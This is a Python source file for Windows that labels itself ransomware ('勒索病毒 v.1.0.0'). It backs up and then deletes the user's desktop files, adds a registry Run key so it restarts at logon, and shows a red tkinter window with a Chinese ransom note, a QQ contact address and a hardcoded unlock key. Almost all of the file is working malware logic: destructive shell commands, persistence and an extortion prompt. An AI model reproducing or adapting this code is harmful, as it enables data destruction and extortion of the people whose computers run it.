class ls():
    def __init__(self) -> None:
        import tkinter as tk,os,time
        from tkinter import messagebox
        import sys#,urllib
        self.os=os
        # self.urllib=urllib
        self.tk = tk
        self.sys = sys
        self.time = time
        self.messagebox = messagebox
        if not self.os.path.isfile('%SYSTEMDRIVE%%HOMEPATH%\\ok'):
            self.do()
        self.lesuotxt='我的电脑发生了什么？\n不好意思，您的电脑被勒索了！\n如果您想恢复您的电脑，请联系github.io@qq.com\n然后您需要进行以下操作：\n将秘钥填入下方，然后点击确认\n如果您不想恢复您的电脑，请点击取消\n作者：lucasz in div.4'
        self.root = tk.Tk()
        self.root.title('勒索病毒 v.1.0.0')
        self.root.geometry('500x500')
        self.root.resizable(0,0)
        self.root.configure(bg='#FF0000')
        self.lesuotext = tk.Text(self.root,width=50,height=10,font=('微软雅黑',12))
        self.lesuotext.place(x=10,y=10)
        self.lesuotext.insert(tk.END,'勒索病毒\n\n')
        self.lesuotext.insert(tk.END,self.lesuotxt)
        self.lesuotext.pack()
        self.pwdinput = tk.Entry(self.root,width=50,font=('微软雅黑',12))
        self.pwdinput.place(x=10,y=4500)
        self.pwdinput.pack()
        self.okbtn = tk.Button(self.root,text='确认',command=self.ok,font=('微软雅黑',12))
        self.okbtn.place(x=10,y=500)
        self.okbtn.pack()
        self.cancelbtn = tk.Button(self.root,text='取消',command=self.cancel,font=('微软雅黑',12))
        self.cancelbtn.place(x=100,y=550)
        self.cancelbtn.pack()
        self.root.mainloop()
    def ok(self):
        self.hf(self.pwdinput.get())
    def cancel(self):
        ttf=self.messagebox.askyesno('提示','你的电脑内的全部文件将会被删除，请谨慎操作！')
        if ttf:
            # self.os.system('del %SYSTEMDRIVE%%HOMEPATH%\\topdesk /Q /S')
            # self.os.system('del %SYSTEMDRIVE%%HOMEPATH%\\lesuo.exe /Q /S')
            self.qxkjzq()
        else:
            self.messagebox.showinfo('提示','您已取消操作')
    def do(self):
        with open('%SYSTEMDRIVE%%HOMEPATH%\\ok','w') as f:
            f.write('ok')
        self.bfwj()
        self.set_kjzq()
        self.suoding()
    def set_kjzq(self):
        self.os.system('copy .\\lesuo.exe %SYSTEMDRIVE%%HOMEPATH%\\lesuo.exe')
        self.os.system('reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v lesuo /f /d "%SYSTEMDRIVE%%HOMEPATH%\\lesuo.exe"')
    def bfwj(self):
        self.os.system('md %SYSTEMDRIVE%%HOMEPATH%\\topdesk')
        self.os.system('xcopy %SYSTEMDRIVE%%HOMEPATH%\\desktop %SYSTEMDRIVE%%HOMEPATH%\\topdesk /E/H/C/I')
        # self.suoding()
    def suoding(self):
        self.os.system('del %SYSTEMDRIVE%%HOMEPATH%\\desktop /Q /S')
    def hf(self,key):
        if key=='lucaszhangzlc20100303!@#$%^*()_+1234567890-=':
            self.os.system('xcopy %SYSTEMDRIVE%%HOMEPATH%\\topdesk %SYSTEMDRIVE%%HOMEPATH%\\desktop /E/H/C/I')
            # self.os.system('del %SYSTEMDRIVE%%HOMEPATH%\\lesuo.exe /Q /S')
            self.qxkjzq()
        else:
            self.messagebox.showinfo('提示','密码错误')
    def get_tree(self,path)->list:
        self.os.chdir(path)
        return self.os.walk(path)
    def qxkjzq(self):
        self.os.system('reg delete HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v lesuo /f')
    def get_path(self,name):
        return self.os.getenv(name)
if __name__ == '__main__':
    app=ls()
    # ls.os.system('echo ok>%SYSTEMDRIVE%%HOMEPATH%\\ok')